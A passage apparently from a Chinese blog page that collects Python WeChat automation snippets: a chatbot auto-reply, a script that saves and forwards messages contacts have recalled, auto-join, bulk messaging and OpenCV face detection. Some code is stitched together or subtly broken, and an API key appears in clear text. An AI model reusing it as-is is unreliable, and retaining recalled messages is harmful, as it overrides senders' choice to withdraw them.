此apikey为wxpy自带apikey，有使用次数限制，建议自己免费申请一个</span></span><br><span class="line"><span class="string">        图灵机器人免费申请地址 http://www.tuling123.com</span></span><br><span class="line"><span class="string">    "</span><span class="string">""</span></span><br><span class="line">    apikey = <span class="string">'7c8cdb56b0dc4450a8deef30a496bd4c'</span></span><br><span class="line">    api_url = <span class="string">'http://www.tuling123.com/openapi/api'</span></span><br><span class="line">    data = &#123;<span class="string">'key'</span>: apikey, <span class="string">'info'</span>: <span class="string">'你好'</span>&#125;</span><br><span class="line">    req = requests.post(api_url, data=data).text</span><br><span class="line">    replys = json.loads(req)[<span class="string">'text'</span>]</span><br><span class="line">    print(replys)</span><br><span class="line">    </span><br><span class="line">    bot = Bot()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    def auto_accept_friends(msg):</span><br><span class="line">        <span class="string">""</span><span class="string">"自动接受好友https://github.com/pig6/wxrobot/blob/master/wx_friend.py"</span><span class="string">""</span></span><br><span class="line">        # 接受好友请求</span><br><span class="line">        new_friend = msg.card.accept()</span><br><span class="line">        # 向新的好友发送消息</span><br><span class="line">        new_friend.send(<span class="string">'我已自动接受了你的好友请求'</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    def auto_reply(msg):</span><br><span class="line">        <span class="string">""</span><span class="string">"自动回复"</span><span class="string">""</span></span><br><span class="line">        # 关键字回复 or 图灵机器人回复</span><br><span class="line">        keyword_reply(msg) or tuling_reply(msg)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    def keyword_reply(msg):</span><br><span class="line">        <span class="string">""</span><span class="string">"关键字回复"</span><span class="string">""</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'你叫啥'</span> <span class="keyword">in</span> msg.text or <span class="string">'你叫啥名字'</span> <span class="keyword">in</span> msg.text:</span><br><span class="line">            <span class="keyword">return</span> msg.reply(<span class="string">'沃德天·维森莫·拉莫帅·帅德布耀'</span>)</span><br><span class="line">        pass</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    def tuling_reply(msg):</span><br><span class="line">        <span class="string">""</span><span class="string">"图灵机器人回复"</span><span class="string">""</span></span><br><span class="line">        tuling_robot.auto_reply(msg)</span><br></pre></td></tr></table></figure>
<h3 id="微信防撤回"><a href="#微信防撤回" class="headerlink" title="微信防撤回"></a>微信防撤回</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python3</span></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'jiangwenwen'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itchat</span><br><span class="line"><span class="keyword">from</span> itchat.content <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">print(<span class="string">"该程序由里客云资源站开发，网址：likeyunba.com https://segmentfault.com/a/1190000018691537"</span>)</span><br><span class="line">print(<span class="string">"作者:TANKING"</span>)</span><br><span class="line">print(<span class="string">"打开程序会弹出一个二维码，微信扫码"</span>)</span><br><span class="line">print(<span class="string">"如果二维码弹不出，那就在你这个程序的同一个目录下找到QR.png双击打开扫码"</span>)</span><br><span class="line">print(<span class="string">"扫码后，出现Start auto replying就可以实时监控消息了..."</span>)</span><br><span class="line"></span><br><span class="line">msg_information = &#123;&#125;</span><br><span class="line"># 针对表情包的内容</span><br><span class="line">face_bug = None</span><br><span class="line"></span><br><span class="line">@itchat.msg_register([TEXT, PICTURE, FRIENDS, CARD, MAP, SHARING, RECORDING, ATTACHMENT, VIDEO], isFriendChat=True, isMpChat=True)</span><br><span class="line">def handle_receive_msg(msg):</span><br><span class="line">    global face_bug</span><br><span class="line">    # 接收消息的时间</span><br><span class="line">    msg_time_rec = time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime())</span><br><span class="line">    # 在好友列表列表中查询发送信息的好友昵称</span><br><span class="line">    msg_from = itchat.search_friends(userName=msg[<span class="string">'FromUserName'</span>])[<span class="string">'NickName'</span>]</span><br><span class="line">    # 信息发送的时间</span><br><span class="line">    msg_time = msg[<span class="string">'CreateTime'</span>]</span><br><span class="line">    # 每条信息的ID</span><br><span class="line">    msg_id = msg[<span class="string">'MsgId'</span>]</span><br><span class="line">    # 储存信息的内容</span><br><span class="line">    msg_content = None</span><br><span class="line">    # 储存分享的连接，比如分享的文章和音乐</span><br><span class="line">    msg_share_url = None</span><br><span class="line"></span><br><span class="line">    # 如果发送的消息是文本或者好友推荐</span><br><span class="line">    <span class="keyword">if</span> msg[<span class="string">'Type'</span>] == <span class="string">'Text'</span> or msg[<span class="string">'Type'</span>] == <span class="string">'Friends'</span>:</span><br><span class="line">        msg_content = msg[<span class="string">'Text'</span>]</span><br><span class="line">        print(msg_content)</span><br><span class="line"></span><br><span class="line">    # 如果发送的消息是附件，视频，图片，语音</span><br><span class="line">    elif msg[<span class="string">'Type'</span>] == <span class="string">'Attachment'</span> or msg[<span class="string">'Type'</span>] == <span class="string">'Video'</span> \</span><br><span class="line">        or msg[<span class="string">'Type'</span>] == <span class="string">'Picture'</span>\</span><br><span class="line">            or msg[<span class="string">'Type'</span>] == <span class="string">'Recording'</span>:</span><br><span class="line">        # 内容为下载文件名</span><br><span class="line">        msg_content = msg[<span class="string">'FileName'</span>]</span><br><span class="line">        msg[<span class="string">'Text'</span>](str(msg_content))</span><br><span class="line"></span><br><span class="line">    # 如果消息是推荐的名片</span><br><span class="line">    elif msg[<span class="string">'Type'</span>] == <span class="string">'Card'</span>:</span><br><span class="line">        # 内容是推荐人的昵称和性别</span><br><span class="line">        msg_content = msg[<span class="string">'RecommendInfo'</span>][<span class="string">'NickName'</span>] + <span class="string">'的名片'</span></span><br><span class="line">        <span class="keyword">if</span> msg[<span class="string">'RecommendInfo'</span>][<span class="string">'Sex'</span>] == <span class="number">1</span>:</span><br><span class="line">            msg_content += <span class="string">'性别为男'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg_content += <span class="string">'性别为女'</span></span><br><span class="line"></span><br><span class="line">        print(msg_content)</span><br><span class="line"></span><br><span class="line">    # 如果消息为分享的位置信息</span><br><span class="line">    elif msg[<span class="string">'Type'</span>] == <span class="string">'Map'</span>:</span><br><span class="line">        x, y, location = re.search(</span><br><span class="line">            <span class="string">"&lt;location x=\"(.*?)\" y=\"(.*?)\".*label=\"(.*?)\".*"</span>, msg[<span class="string">'OriContent'</span>]).group(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> location is None:</span><br><span class="line">            # 内容为详细地址</span><br><span class="line">            msg_content = r<span class="string">'纬度-&gt;'</span> + x.__str__() + <span class="string">"经度-&gt;"</span> + y.__str__()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg_content = r<span class="string">""</span> + location</span><br><span class="line"></span><br><span class="line">    # 如果消息是分享的音乐或者文章，详细的内容为文章的标题或者分享的名字</span><br><span class="line">    elif msg[<span class="string">'Type'</span>] == <span class="string">'Sharing'</span>:</span><br><span class="line">        msg_content = msg[<span class="string">'Text'</span>]</span><br><span class="line">        msg_share_url = msg[<span class="string">'Url'</span>]</span><br><span class="line">        print(msg_share_url)</span><br><span class="line">    face_bug = msg_content</span><br><span class="line"></span><br><span class="line">    # 将信息存储在字典中，每一个msg_id对应一条消息</span><br><span class="line">    msg_information.update(</span><br><span class="line">        &#123;</span><br><span class="line">            msg_id: &#123;</span><br><span class="line">                <span class="string">"msg_from"</span>: msg_from, <span class="string">"msg_time"</span>: msg_time, <span class="string">"msg_time_rec"</span>: msg_time_rec,</span><br><span class="line">                <span class="string">"msg_type"</span>: msg[<span class="string">'Type'</span>],</span><br><span class="line">                <span class="string">"msg_content"</span>: msg_content, <span class="string">"msg_share_url"</span>: msg_share_url</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">#这个是用于监听是否有friend消息撤回</span><br><span class="line">@itchat.msg_register(NOTE, isFriendChat=True, isGroupChat=True, isMpChat=True)</span><br><span class="line">def information(msg):</span><br><span class="line">    # 这里如果这里的msg['Content']中包含消息撤回和id，就执行下面的语句</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'撤回了一条消息'</span> <span class="keyword">in</span> msg[<span class="string">'Content'</span>]:</span><br><span class="line">        old_msg_id = re.search(<span class="string">"\&lt;msgid\&gt;(.*?)\&lt;\/msgid\&gt;"</span>, msg[<span class="string">'Content'</span>]).group(<span class="number">1</span>)</span><br><span class="line">        # 得到消息</span><br><span class="line">        old_msg = msg_information.get(old_msg_id)</span><br><span class="line">        print(old_msg)</span><br><span class="line"></span><br><span class="line">        # 如果发送的是表情</span><br><span class="line">        <span class="keyword">if</span> len(old_msg_id)&lt;<span class="number">11</span>:</span><br><span class="line">            itchat.send_file(face_bug, toUserName=<span class="string">'filehelper'</span>)</span><br><span class="line">        # 发送撤回的提示给文件助手</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg_body = <span class="string">"【"</span>\</span><br><span class="line">                       + old_msg.get(<span class="string">'msg_from'</span>) + <span class="string">"撤回了】\n"</span>\</span><br><span class="line">                       + old_msg.get(<span class="string">"msg_type"</span>) + <span class="string">"消息:"</span> + <span class="string">"\n"</span>\</span><br><span class="line">                       + old_msg.get(<span class="string">"msg_time_rec"</span>) + <span class="string">"\n"</span>\</span><br><span class="line">                       + r<span class="string">""</span> + old_msg.get(<span class="string">"msg_content"</span>)</span><br><span class="line"></span><br><span class="line">        # 如果分享的文件被撤回了，那么就将分享的url加在msg_body中发送给文件助手</span><br><span class="line">        <span class="keyword">if</span> old_msg[<span class="string">'msg_type'</span>] == <span class="string">"Sharing"</span>:</span><br><span class="line">            msg_body += <span class="string">"\n就是这个链接&gt;"</span> + old_msg.get(<span class="string">'msg_share_url'</span>)</span><br><span class="line"></span><br><span class="line">        # 将撤回消息发送到文件助手</span><br><span class="line">        itchat.send_msg(msg_body, toUserName=<span class="string">"filehelper"</span>)</span><br><span class="line"></span><br><span class="line">        # 有文件的话也要将文件发送回去</span><br><span class="line">        <span class="keyword">if</span> old_msg[<span class="string">"msg_type"</span>] == <span class="string">"Picture"</span>\</span><br><span class="line">                or old_msg[<span class="string">"msg_type"</span>] == <span class="string">"Recording"</span>\</span><br><span class="line">                or old_msg[<span class="string">"msg_type"</span>] == <span class="string">"Video"</span>\</span><br><span class="line">                or old_msg[<span class="string">"msg_type"</span>] == <span class="string">"Attachment"</span>:</span><br><span class="line">            file = <span class="string">"@fil@%s"</span> % (old_msg[<span class="string">'msg_content'</span>])</span><br><span class="line">            itchat.send(msg=file, toUserName=<span class="string">'filehelper'</span>)</span><br><span class="line">            os.remove(old_msg[<span class="string">'msg_content'</span>])</span><br><span class="line"></span><br><span class="line">        # 删除字典旧信息</span><br><span class="line">        msg_information.pop(old_msg_id)</span><br><span class="line"></span><br><span class="line">itchat.auto_login(hotReload=True)</span><br><span class="line">itchat.run()</span><br></pre></td></tr></table></figure>
<h3 id="自动加群"><a href="#自动加群" class="headerlink" title="自动加群"></a>自动加群</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">    #coding=utf-8</span><br><span class="line"><span class="keyword">from</span> wxpy <span class="keyword">import</span> *</span><br><span class="line">base_bot = Bot(True)</span><br><span class="line"># 查找指定群聊群聊 ， 确保扫码微信中有 “123” 这个群</span><br><span class="line">group = base_bot.groups().search(<span class="string">'123'</span>)</span><br><span class="line"># 自动接受新的好友请求</span><br><span class="line">@base_bot.register(msg_types=FRIENDS)</span><br><span class="line">def auto_accept_friends(msg):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'加好友'</span> <span class="keyword">in</span> msg.text.lower():</span><br><span class="line">        # 接受好友请求</span><br><span class="line">        new_friend = base_bot.accept_friend(msg.card)</span><br><span class="line">        # new_friend = msg.card.accept()</span><br><span class="line">        # 向新的好友发送消息</span><br><span class="line">        new_friend.send(<span class="string">'你好，我是群聊机器人，回复"入群"口令进入群聊天哦！'</span>)</span><br><span class="line"># 接收文字消息的装饰器</span><br><span class="line">@base_bot.register(msg_types=TEXT)</span><br><span class="line">def add_into_chatroom(msg):</span><br><span class="line">    # 接收进群口令</span><br><span class="line">    <span class="keyword">if</span> msg.text.lower() == <span class="string">'入群'</span>:</span><br><span class="line">        # use_invitation为True，发送群邀请，False则拉进群聊</span><br><span class="line">        group[<span class="number">0</span>].add_members(msg.sender, use_invitation=True)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        # 其他消息</span><br><span class="line">        <span class="keyword">return</span> u<span class="string">'收到：'</span> + msg.text</span><br><span class="line">base_bot.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sex, count <span class="keyword">in</span> friends_stat[<span class="string">"sex"</span>].iteritems():</span><br><span class="line">    # 1代表MALE, 2代表FEMALE</span><br><span class="line">    <span class="keyword">if</span> sex == <span class="number">1</span>:</span><br><span class="line">        print <span class="string">"MALE %d"</span> % count</span><br><span class="line">    elif sex == <span class="number">2</span>:</span><br><span class="line">        print <span class="string">"FEMALE %d"</span> % count</span><br><span class="line">        </span><br><span class="line"> <span class="keyword">from</span> wxpy <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"> bot = Bot(cache_path=True)</span><br><span class="line"> friends_stat = bot.friends().stats()</span><br><span class="line"> </span><br><span class="line"> friend_loc = [] # 每一个元素是一个二元列表，分别存储地区和人数信息</span><br><span class="line"> <span class="keyword">for</span> province, count <span class="keyword">in</span> friends_stat[<span class="string">"province"</span>].iteritems():</span><br><span class="line">     <span class="keyword">if</span> province != <span class="string">""</span>: </span><br><span class="line">         friend_loc.append([province, count])</span><br><span class="line"> </span><br><span class="line"> # 对人数倒序排序</span><br><span class="line"> friend_loc.sort(key=lambda x: x[<span class="number">1</span>], reverse=True)</span><br><span class="line"> </span><br><span class="line"> # 打印人数最多的10个地区</span><br><span class="line"> <span class="keyword">for</span> item <span class="keyword">in</span> friend_loc[:<span class="number">10</span>]:</span><br><span class="line">     print item[<span class="number">0</span>], item[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<h3 id="群发消息"><a href="#群发消息" class="headerlink" title="群发消息"></a>群发消息</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"># 初始化一个机器人对象https://yfzhou.coding.me/2018/09/04/%E5%BE%AE%E4%BF%A1%E6%9C%80%E5%BC%BA%E8%8A%B1%E5%BC%8F%E6%93%8D%E4%BD%9C%EF%BC%8C%E5%B8%A6%E4%BD%A0%E7%8E%A9%E8%BD%AC-wxpy/</span><br><span class="line">#https://gitee.com/ShaErHu/wxpy_matplotlib_learning</span><br><span class="line"># cache_path为登录状态缓存路径，给定值为第一次登录生成的缓存文件路径</span><br><span class="line">bot = Bot(cache_path=<span class="string">"D:\PycharmProjects\pythonProcedure\com\zyf\weixin\wxpy.pkl"</span>)</span><br><span class="line"></span><br><span class="line"># 群发消息（谨慎使用，哈哈哈）</span><br><span class="line">my_friends = bot.friends(update=False)</span><br><span class="line">my_friends.pop(0)   # 去除列表第一个元素（自己）</span><br><span class="line">for i in range(120): # 时间限制2分钟内最多发120次（具体看wxpy官方文档异常处理）</span><br><span class="line">    friend = my_friends[i]</span><br><span class="line">    friend.send(<span class="string">'Good morning,the early bird catches the worm!(早上好，早起的鸟儿有虫吃！)'</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    friend.send(<span class="string">'不用回复，生活中一起加油！'</span>)</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line"># 获取所有好友[返回列表包含Chats对象(你的所有好友，包括自己)]</span><br><span class="line">t0 = bot.friends(update=False)</span><br><span class="line"># 查看自己好友数(除开自己)</span><br><span class="line">print(<span class="string">"我的好友数："</span>+str(len(t0)<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"># 获取所有微信群[返回列表包含Groups对象]</span><br><span class="line">t1 = bot.groups(update=False)</span><br><span class="line"># 查看微信群数(活跃的)</span><br><span class="line">print(<span class="string">"我的微信群聊数："</span>+str(len(t1)))</span><br><span class="line"></span><br><span class="line"># 获取所有关注的微信公众号[返回列表包含Chats对象]</span><br><span class="line">t2 = bot.mps(update=False)</span><br><span class="line"># 查看关注的微信公众号数</span><br><span class="line">print(<span class="string">"我关注的微信公众号数："</span>+str(len(t2)))</span><br><span class="line"># 初始化一个机器人对象</span><br><span class="line"># cache_path缓存路径，给定值为第一次登录生成的缓存文件路径</span><br><span class="line">bot = Bot(cache_path=<span class="string">"D:\PycharmProjects\pythonProcedure\com\zyf\weixin\wxpy.pkl"</span>)</span><br><span class="line">#获取好友列表(包括自己)</span><br><span class="line">my_friends = bot.friends(update=False)</span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">stats_text 函数：帮助我们简单统计微信好友基本信息</span></span><br><span class="line"><span class="string">简单的统计结果的文本</span></span><br><span class="line"><span class="string">    :param total: 总体数量</span></span><br><span class="line"><span class="string">    :param sex: 性别分布</span></span><br><span class="line"><span class="string">    :param top_provinces: 省份分布</span></span><br><span class="line"><span class="string">    :param top_cities: 城市分布</span></span><br><span class="line"><span class="string">    :return: 统计结果文本</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line">print(my_friends.stats_text())</span><br><span class="line">bot = Bot(cache_path=<span class="string">"D:\PycharmProjects\pythonProcedure\com\zyf\weixin\wxpy.pkl"</span>)</span><br><span class="line">#获取好友列表(包括自己)</span><br><span class="line">my_friends = bot.friends(update=False)</span><br><span class="line"># 微信昵称</span><br><span class="line">nick_name = <span class="string">''</span></span><br><span class="line"># 微信个性签名</span><br><span class="line">wx_signature = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> friend <span class="keyword">in</span> my_friends:</span><br><span class="line">    # 微信昵称：NickName</span><br><span class="line">    nick_name = nick_name + friend.raw[<span class="string">'NickName'</span>]</span><br><span class="line">    # 个性签名：Signature</span><br><span class="line">    wx_signature = wx_signature + friend.raw[<span class="string">'Signature'</span>]</span><br><span class="line"></span><br><span class="line">nick_name = jiebaclearText(nick_name)</span><br><span class="line">wx_signature = jiebaclearText(wx_signature)</span><br><span class="line">make_wordcloud(nick_name,<span class="number">1</span>)</span><br><span class="line">make_wordcloud(wx_signature,<span class="number">2</span>)</span><br><span class="line"># 获取微信公众号名称</span><br><span class="line">wx_public_name = <span class="string">''</span></span><br><span class="line"># 公众号简介</span><br><span class="line">wx_pn_signature = <span class="string">''</span></span><br><span class="line"># 获取微信公众号列表</span><br><span class="line">my_wx_pn = bot.mps(update=False)</span><br><span class="line"><span class="keyword">for</span> wx_pn <span class="keyword">in</span> my_wx_pn:</span><br><span class="line">    wx_public_name = wx_public_name + wx_pn.raw[<span class="string">'NickName'</span>]</span><br><span class="line">    wx_pn_signature = wx_pn_signature + wx_pn.raw[<span class="string">'Signature'</span>]</span><br><span class="line"></span><br><span class="line">wx_public_name = jiebaclearText(wx_public_name)</span><br><span class="line">make_wordcloud(wx_public_name,<span class="number">3</span>)</span><br><span class="line">wx_pn_signature = jiebaclearText(wx_pn_signature)</span><br><span class="line">make_wordcloud(wx_pn_signature,<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<h3 id="人脸识别"><a href="#人脸识别" class="headerlink" title="人脸识别"></a>人脸识别</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2018/11/5 14:21</span><br><span class="line"># @Author  : yfzhou</span><br><span class="line"># @Site    : </span><br><span class="line"># @File    : face_id.py</span><br><span class="line"># @Software: PyCharm</span><br><span class="line"># Life is short, I use python.</span><br><span class="line"># 人脸识别https://yfzhou.coding.me/2018/11/12/OpenCV-Python-%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB/</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">filename = <span class="string">"C:\\Users\\Administrator\\Pictures\\2018-05-16\\1865.JPG"</span></span><br><span class="line"></span><br><span class="line">def detect(filename):</span><br><span class="line">    # haarcascade_frontalface_default.xml存储在package安装的位置</span><br><span class="line">    # haarcascade_frontalface_default 识别人脸</span><br><span class="line">    # haarcascade_eye 识别眼睛</span><br><span class="line">    face_cascade = cv2.CascadeClassifier(</span><br><span class="line">        <span class="string">"D:\\Python\\Python37\\Lib\\site-packages\\cv2\\data\\haarcascade_frontalface_default.xml"</span>)</span><br><span class="line">    eye_cascade = cv2.CascadeClassifier(<span class="string">"D:\\Python\\Python37\\Lib\\site-packages\\cv2\\data\\haarcascade_eye.xml"</span>)</span><br><span class="line">    img = cv2.imread(filename)</span><br><span class="line">    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)</span><br><span class="line">    # 传递参数是scaleFactor和minNeighbors,分别表示人脸检测过程中每次迭代时图像的压缩率以及每个人脸矩形保留近邻数目的最小值</span><br><span class="line">    # 检测结果返回人脸矩形数组</span><br><span class="line">    faces = face_cascade.detectMultiScale(gray, <span class="number">1.1</span>, <span class="number">5</span>)</span><br><span class="line">    print(faces)</span><br><span class="line">    <span class="keyword">for</span> (x, y, w, h) <span class="keyword">in</span> faces:</span><br><span class="line">        # 给最新的检测到的人脸图片外面，标明一个方框</span><br><span class="line">        img = cv2.rectangle(img, (x, y), (x + w, y + h), (<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>), <span class="number">3</span>)</span><br><span class="line">        face_re = img[y:y + h, <span class="attr">x</span>:x + h]</span><br><span class="line">        face_re_g = gray[y:y + h, <span class="attr">x</span>:x + h]</span><br><span class="line">        eyes = eye_cascade.detectMultiScale(face_re_g)</span><br><span class="line">        <span class="keyword">for</span> (ex, ey, ew, eh) <span class="keyword">in</span> eyes:</span><br><span class="line">            cv2.rectangle(face_re, (ex, ey), (ex + ew, ey + eh), (<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    # cv2.namedWindow("Human Face Result!")</span><br><span class="line">    # cv2.imshow("Human Face Result!", img)</span><br><span class="line">    # 吧识别后的图片保存至指定目录</span><br><span class="line">    cv2.imwrite(<span class="string">"C:\\Users\\Administrator\\Pictures\\2018-05-16\\Face.jpg"</span>, img)</span><br><span class="line">    # cv2.waitKey(0)</span><br><span class="line">    # cv2.destroyAllWindows()</span><br><span class="line"></span><br><span class="line">detect(filename)</span><br></pre></td></tr></table></figure>
